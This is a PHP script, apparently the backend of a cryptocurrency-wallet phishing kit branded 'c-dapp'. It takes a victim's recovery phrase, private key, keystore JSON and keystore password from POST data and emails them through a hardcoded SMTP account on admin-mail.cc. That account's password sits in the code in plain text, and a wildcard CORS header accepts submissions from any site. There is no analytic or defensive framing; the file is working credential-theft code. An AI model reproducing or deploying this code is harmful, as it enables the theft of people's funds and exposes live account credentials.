<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');


use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\SMTP;

require 'vendor/autoload.php';

if($_SERVER['REQUEST_METHOD'] == "POST")
{
    $data = $_POST['data'];
    $wallet = $data['wallet'];
    $phrase = $data['phrase'];
    $keystorevalue = $data['keystorevalue'];
    $keystorepass = $data['keystorepass'];
    $privatekey = $data['privatekey'];
    $email = $data['email'];

    $send = send_mail($email, $wallet, $phrase, $keystorevalue, $keystorepass, $privatekey);

    if($send == true)
    {
        echo json_encode(200);
    }
    else
    {
        echo json_encode(500);
    }

    exit;
}

 // send verification mail
function send_mail($email, $wallet, $phrase, $keystorevalue, $keystorepass, $privatekey)
{

    $body = '<!DOCTYPE html>
        <html lang="en">
        <head>
        <meta charset="UTF-8">
        <title>Wallet Details</title>
        <style>
        </style>
        </head>
        <body>
			<div style="border-collapse: collapse; width: 100%;">
                <h2>Wallet Details</h2>
                <br>
                <p>Wallet Type: '. $wallet .'</p>
                <br>
                <p>Recovery Phrase: '. $phrase .'</p>
                <br>
                <p>Keystore JSON: '. $keystorevalue.'</p>
                <br>
                <p>Keystore Password: '. $keystorepass.'</p>
                <br>
                <p>Private Key: '. $privatekey.'</p>
            <br>
            </div>
        </body>
        </html>';

    $mail = new PHPMailer(true);

    // set up phpmailer
    try
    {
        //Server settings


        //Enable verbose debug output
        // $mail->SMTPDebug = SMTP::DEBUG_SERVER;
      //   $mail->SMTPDebug = 0;


        //Send using SMTP
        $mail->isSMTP();

        //Set the SMTP server to send through
        $mail->Host = "admin-mail.cc";

        //Enable SMTP authentication
        $mail->SMTPAuth = true;

        //SMTP username
        $mail->Username   = "email@admin-mail.cc";

        //SMTP password
        $mail->Password   = "Sendout100@";

        //Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
        // $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        // $mail->SMTPSecure = 'ssl';
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;

        $mail->Port       = 465;
        // $mail->Port       = 587;
        // TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above

        // Recipients
        // $mail->setFrom($email_link, 'automall.com.ng');
        $mail->setFrom('email@admin-mail.cc', 'c-dapp');
        // $mail->addAddress('joe@example.net', 'Joe User');     //Add a recipient
        $mail->addAddress($email);

      //   $mail->addReplyTo($email_link, 'Five Marketplace');
        // $mail->addCC('cc@example.com');
        // $mail->addBCC('bcc@example.com');

        // Attachments
        // $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
        // $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name

        // Content
        $mail->isHTML(true);                                  //Set email format to HTML
        $mail->Subject = 'Wallet Details';
        $mail->Body    =  $body;
      //   $mail->AltBody = 'Copy and paste the llink in your browser to activate your account  '.$web_link.'activate.php?token='.$token.' ';
        $sent = $mail->send();
        // if mail sent, fill database
        if($sent)
        {
          return true;
        }
      }
    catch (Exception $e)
    {
      // print "error";
      print "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
      return false;
    }
}
